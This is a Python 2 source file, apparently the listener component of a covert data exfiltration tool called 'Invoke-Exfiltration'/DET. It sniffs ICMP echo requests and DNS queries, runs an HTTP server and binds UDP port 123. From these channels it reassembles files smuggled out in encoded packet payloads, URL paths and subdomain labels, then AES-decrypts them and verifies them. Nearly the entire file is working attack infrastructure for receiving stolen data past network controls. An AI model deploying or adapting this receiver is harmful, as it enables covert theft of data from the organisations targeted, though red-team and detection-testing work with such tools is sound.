import os
import random
import threading
import hashlib
import argparse
import sys
import string
import time
import signal
from random import randint
from os import listdir
from os.path import isfile, join
from Crypto.Cipher import AES
from zlib import compress, decompress

# Plugins
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from dnslib import *
from scapy import all as scapy
import base64
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import socket

KEY = ""
MIN_TIME_SLEEP = 1
MAX_TIME_SLEEP = 30
MIN_BYTES_READ = 1
MAX_BYTES_READ = 500
COMPRESSION    = True
files = {}
threads = []
# Plugins
config = None
app_exfiltrate = None
domain = None
port = None
register = None
buf = {}

class Plugin:

    def __init__(self, app, conf, prt, dm):
        global app_exfiltrate, config, port, domain
        app_exfiltrate = app
        config = conf
	if config == "icmp": 
            app.register_plugin('icmp', {'listen': self.icmp_listen})
	elif config == "http":
	    port = int(prt)
	    app.register_plugin('http', {'listen': self.http_listen})
	elif config == "ntp":
	    app.register_plugin('ntp', {'listen': self.ntp_listen})
	else:
	    domain = unicode(dm, "utf-8")
	    app.register_plugin('dns', {'listen': self.dns_listen})

    def icmp_listen(self):
	app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
    	scapy.sniff(filter="icmp and icmp[0]=8", prn=self.icmp_analyze)

    def http_listen(self):
    	app_exfiltrate.log_message('info', "[http] Starting httpd...")
    	try:
            server_address = ('', port)
            httpd = HTTPServer(server_address, S)
            httpd.serve_forever()
    	except:
            app_exfiltrate.log_message(
                'warning', "[http] Couldn't bind http daemon on port {}".format(port))

    def dns_listen(self):
    	app_exfiltrate.log_message(
            'info', "[dns] Waiting for DNS packets for domain {0}".format(domain))
    	scapy.sniff(filter="udp and port {}".format(int("53")), prn=self.handle_dns_packet)

    def ntp_listen(self):
	global register
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	p = 123
	try:
            server_address = ('', p)
            sock.bind(server_address)
            app_exfiltrate.log_message(
        	'info', "[udp] Starting server on port {}...".format(p))
	except socket.error as e:
            app_exfiltrate.log_message(
        	'warning', "[udp] Couldn't bind on port {}...".format(p))
            sys.exit(-1)

	while True:
            app_exfiltrate.log_message('info', "[udp] Waiting for connections...")
            try:
            	while True:
                    data, client_address = sock.recvfrom(65535)
                    app_exfiltrate.log_message(
                    	'info', "[udp] client connected: {}".format(client_address))
                    if data:
                    	app_exfiltrate.log_message(
                            'info', "[udp] Received {} bytes".format(len(data)))
                    	try:
			    if "REG-" in data:
				if "REGISTER" in data:
				    register = data.replace("REG-","")
				else:
				    register = register + data.replace("REG-","")
				    register = filter(lambda x: x in string.printable, register)
				    app_exfiltrate.retrieve_data(register) 
			    else:
				data = filter(lambda x: x in string.printable, data)
			    	app_exfiltrate.retrieve_data(data)
                    	except Exception, e:
                            app_exfiltrate.log_message(
                            	'warning', "[udp] Failed decoding message {}".format(e))
                    else:
                    	break
            finally:
            	pass

    def icmp_analyze(self, packet):
    	src = packet.payload.src
    	dst = packet.payload.dst
    	try:
            app_exfiltrate.log_message(
                'info', "[icmp] Received ICMP packet from: {0} to {1}".format(src, dst))
	    app_exfiltrate.retrieve_data(base64.b64decode(packet.load))
    	except:
           pass

    def handle_dns_packet(self, x):
    	global buf
    	try:
            qname = x.payload.payload.payload.qd.qname
            if (domain in qname):
            	app_exfiltrate.log_message(
                    'info', '[dns] DNS Query: {0}'.format(qname))
            	data = qname.split(".")[0]
            	jobid = data[0:7]
            	data = data.replace(jobid, '')
            	if jobid not in buf:
                    buf[jobid] = []
            	if data not in buf[jobid]:
                    buf[jobid].append(data)
            	if (len(qname) < 68):
                    app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
                    buf[jobid] = []
    	except Exception, e:
            pass

class S(BaseHTTPRequestHandler):

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        string = '/'.join(self.path.split('/')[1:])
        self._set_headers()
        try:
            data = base64.b64decode(string)
            app_exfiltrate.retrieve_data(data)
        except Exception, e:
            pass

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def display_message(message):
    print "[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message)


def warning(message):
    display_message("%s%s%s" % (bcolors.WARNING, message, bcolors.ENDC))


def ok(message):
    display_message("%s%s%s" % (bcolors.OKGREEN, message, bcolors.ENDC))


def info(message):
    display_message("%s%s%s" % (bcolors.OKBLUE, message, bcolors.ENDC))

def aes_decrypt(message, key=KEY):
    try:
        # Retrieve CBC IV
        iv = message[:AES.block_size]
        message = message[AES.block_size:]

        # Derive AES key from passphrase
        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
        message = aes.decrypt(message)

        # Remove PKCS5 padding
        unpad = lambda s: s[:-ord(s[len(s) - 1:])]

        return unpad(message)
    except:
        return None

def aes_encrypt(message, key=KEY):
    try:
        # Generate random CBC IV
        iv = os.urandom(AES.block_size)

        # Derive AES key from passphrase
        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)

        # Add PKCS5 padding
        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

        # Return data size, iv and encrypted message
        return iv + aes.encrypt(pad(message))
    except:
        return None

# Do a md5sum of the file
def md5(fname):
    hash = hashlib.md5()
    with open(fname) as f:
        for chunk in iter(lambda: f.read(4096), ""):
            hash.update(chunk)
    return hash.hexdigest()


function_mapping = {
    'display_message': display_message,
    'warning': warning,
    'ok': ok,
    'info': info,
    'aes_encrypt' : aes_encrypt,
    'aes_decrypt': aes_decrypt
}


class Exfiltration(object):

    def __init__(self, results, KEY):
        self.KEY = KEY
        self.plugin_manager = None
        self.plugins = {}
        self.results = results
        self.target = "127.0.0.1"

        path = "plugins/"
        plugins = {}

        # Load plugins
        sys.path.insert(0, path)
	for fname in results.type.split(','):
	    plugins[fname] = Plugin(self, fname, results.port, results.domain)

    def register_plugin(self, transport_method, functions):
	self.plugins[transport_method] = functions

    def get_plugins(self):
        return self.plugins

    def aes_encrypt(self, message):
        return aes_encrypt(message, self.KEY)

    def aes_decrypt(self, message):
        return aes_decrypt(message, self.KEY)

    def log_message(self, mode, message):
        if mode in function_mapping:
            function_mapping[mode](message)

    def get_random_plugin(self):
        plugin_name = random.sample(self.plugins, 1)[0]
        return plugin_name, self.plugins[plugin_name]['send']

    def use_plugin(self, plugins):
        tmp = {}
        for plugin_name in plugins.split(','):
            if (plugin_name in self.plugins):
                tmp[plugin_name] = self.plugins[plugin_name]
        self.plugins.clear()
        self.plugins = tmp

    def register_file(self, message):
        global files
        jobid = message[0]
        if jobid not in files:
            files[jobid] = {}
            files[jobid]['checksum'] = message[3].lower()
            files[jobid]['filename'] = message[1].lower()
            files[jobid]['data'] = []
            files[jobid]['packets_number'] = []
            warning("Register packet for file %s with checksum %s" %
                    (files[jobid]['filename'], files[jobid]['checksum']))

    def retrieve_file(self, jobid):
        global files
        fname = files[jobid]['filename']
        filename = "%s.%s" % (fname.replace(os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
        content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')
        if self.KEY is not None:
	    info("Decrypting content from %s" % (fname))
	    content = aes_decrypt(content, self.KEY)
        f = open(filename, 'w')
        f.write(content)
        f.close()
        if (files[jobid]['checksum'] == md5(filename)):
            ok("File %s recovered" % (fname))
        else:
            warning("File %s corrupt!" % (fname))
        del files[jobid]

    def retrieve_data(self, data):
        global files
	try:
            message = data
            if (message.count("|!|") >= 2):
                info("Received {0} bytes".format(len(message)))
                message = message.split("|!|")
                jobid = message[0]

                # register packet
                if (message[2] == "REGISTER"):
                    self.register_file(message)
                # done packet
                elif (message[2] == "DONE"):
                    self.retrieve_file(jobid)
                # data packet
                else:
                    # making sure there's a jobid for this file
                    if (jobid in files and message[1] not in files[jobid]['packets_number']):
                        files[jobid]['data'].append(''.join(message[3:]))
                        files[jobid]['packets_number'].append(message[1])
        except:
            raise
            pass

def signal_handler(bla, frame):
    global threads
    warning('Killing All Listeners')
    os.kill(os.getpid(), signal.SIGKILL)

def main():
    global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
    global threads, config

    parser = argparse.ArgumentParser(
        description='Invoke-Exfiltration Listener')
    parser.add_argument('-k', action="store", dest="key", default=None,
                        help="AES Key to use (eg. 'THEKEY')")
    parser.add_argument('-t', action="store", dest="type", default=None,
                        help="Plugin to use (eg. 'dns,http,icmp')")
    parser.add_argument('-p', action="store", dest="port", default=None,
                        help="Port number to use for HTTP exfiltration (eg. '8080')")
    parser.add_argument('-d', action="store", dest="domain", default=None,
			help="Domain to use for DNS exfiltration")
    results = parser.parse_args()

    if (results.type is None):
        print "Specify correct type for exfiltration!"
        parser.print_help()
        sys.exit(-1)

    if ("http" in results.type and results.port is None):
        print "Specify a port for HTTP exfiltration!"
        parser.print_help()
        sys.exit(-1)

    if ("dns" in results.type and results.domain is None):
	print "Specify a domain for DNS exfiltration!"
	parser.print_help()
	sys.exit(-1)

    # catch Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    ok("CTRL+C to kill DET")

    MIN_TIME_SLEEP = 1
    MAX_TIME_SLEEP = 10
    MIN_BYTES_READ = 300
    MAX_BYTES_READ = 400
    COMPRESSION    = 1

    if results.key is not None:
        ok("AES key provided")
        KEY = unicode(results.key, 'utf-8')
    else:
        warning("AES key not provided - decryption is unavailable")
        KEY = results.key

    app = Exfiltration(results, KEY)

    # LISTEN MODE
    threads = []
    plugins = app.get_plugins()
    for plugin in plugins:
        thread = threading.Thread(target=plugins[plugin]['listen'])
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Join for the threads
    for thread in threads:
        while True:
            thread.join(1)
            if not thread.isAlive():
                break

if __name__ == '__main__':
    main()
